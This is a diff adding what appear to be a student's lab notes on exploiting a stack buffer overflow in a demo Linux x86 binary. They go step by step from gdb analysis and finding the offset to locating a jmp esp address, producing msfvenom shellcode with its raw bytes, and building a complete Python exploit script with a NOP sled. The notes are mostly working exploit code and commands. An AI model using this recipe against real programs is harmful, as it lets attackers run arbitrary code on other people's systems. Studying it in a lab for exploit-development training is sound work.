@@ -1,0 +1,116 @@
+Buffer Overflow:
+
+demo:'func'
+(When u see a new program)
+Analysis steps
+
+-Static Analysis:
+	Strings
+		strings func 
+	File (type of file it is)
+		file func
+	
+-Behavioral Analysis:
+	Run Code may need to chmod (./func)(chmod u+x func)
+	Parameter:
+		./func $(echo "12345")   (echo can be any string)
+	User Input:
+		./func <<<$(echo "12345")
+-Dynamic Analysis:
+	Make a script:
+		1. vim linbuff.py                            
+		   :set number 
+
+		   #!user/bin/env python
+
+		   offset= "A" * 100
+
+		   print(offset)
+
+
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/  (Pattern Generator)(get random string)
+
+		   vim linbuff.py
+
+		   #!user/bin/env python
+
+		   offset= "A" * 100
+
+		   offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
+		   print(offset)
+
+
+run gdb against program
+	gdb ./func (from gdb 'shell' to exit)('exit' to get back into gdb)
+	(from gdb) info functions (can ignore anything with underscore in ront or x86)(looking for gets/puts)
+	(from gdb) pdisass main (if u dont have access to peda than disass main)(red=vulnerable function)(if no red go to green and run pdisas <___>)(dig till u find a red)
+	ex. <getuserinput>
+	pdisass getuserinput
+	(from gdp) run <<<$(python linbuff.py)
+	EIP: 0x31634130
+	(if no peda) it will be at the bottom	
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+put 31634130 into register value to get offset(62)
+vim linbuff.py
+
+		   #!user/bin/env python
+
+		   offset= "A" * 62     (switched to 62)
+		   eip = "BBBB"
+		   #offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"	(#commented out or deleted)
+		   print(offset + eip)
+
+(from gdp) run <<<$(python linbuff.py)
+shell
+env - gdb ./func
+unset env LINES
+unset env COLUMNS
+show env
+run, ctrl+c
+info proc map  (looking for heap and stack)(if u dont see heap and stack run 'step' and then 'info proc map' again)
+go to heap grab Start Addr one line down(0xf7de1000)
+go to stack grab End Addr on same line (0xffffe000)
+find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4 (copy first 5 into notes in case first one doesn't work)
+0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+(Big endian have to convert to little endian)
+0xf7 de 3b 59 -> \x59\x3b\xde\xf7	(just reversed)
+0xf7 f5 88 ab
+0xf7 f6 45 fb
+0xf7 f6 46 0f
+0xf7 f6 4a eb
+
+vim linbuff.py
+	#!user/bin/env python
+
+	offset= "A" * 62
+	eip = "\x59\x3b\xde\xf7"
+	nop = "\x90" * 15
+	print(offset + eip + nop)
+(from gdb) quit
+msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python   ("\x00\xfe\x20\x0a\xff" = bad bytes *always use)
+buf =  b""
+buf += b"\xdb\xd5\xd9\x74\x24\xf4\x5d\xbb\x85\xee\x2c\xd6"
+buf += b"\x31\xc9\xb1\x0b\x31\x5d\x19\x03\x5d\x19\x83\xed"
+buf += b"\xfc\x67\x1b\x46\xdd\x3f\x7d\xc5\x87\xd7\x50\x89"
+buf += b"\xce\xc0\xc3\x62\xa2\x66\x14\x15\x6b\x14\x7d\x8b"
+buf += b"\xfa\x3b\x2f\xbb\xfa\xbb\xd0\x3b\x72\xd3\xbf\x5a"
+buf += b"\x11\x4a\x40\xca\xba\x05\xa1\x39\xbc"
+
+	#!user/bin/env python
+
+	offset= "A" * 62
+	eip = "\x59\x3b\xde\xf7"
+	nop = "\x90" * 15
+	buf =  b""
+	buf += b"\xdb\xd5\xd9\x74\x24\xf4\x5d\xbb\x85\xee\x2c\xd6"
+	buf += b"\x31\xc9\xb1\x0b\x31\x5d\x19\x03\x5d\x19\x83\xed"
+	buf += b"\xfc\x67\x1b\x46\xdd\x3f\x7d\xc5\x87\xd7\x50\x89"
+	buf += b"\xce\xc0\xc3\x62\xa2\x66\x14\x15\x6b\x14\x7d\x8b"
+	buf += b"\xfa\x3b\x2f\xbb\xfa\xbb\xd0\x3b\x72\xd3\xbf\x5a"
+	buf += b"\x11\x4a\x40\xca\xba\x05\xa1\x39\xbc"
+	print(offset + eip + nop + buf)
+./func <<<$(python linbuff.py)    (student)
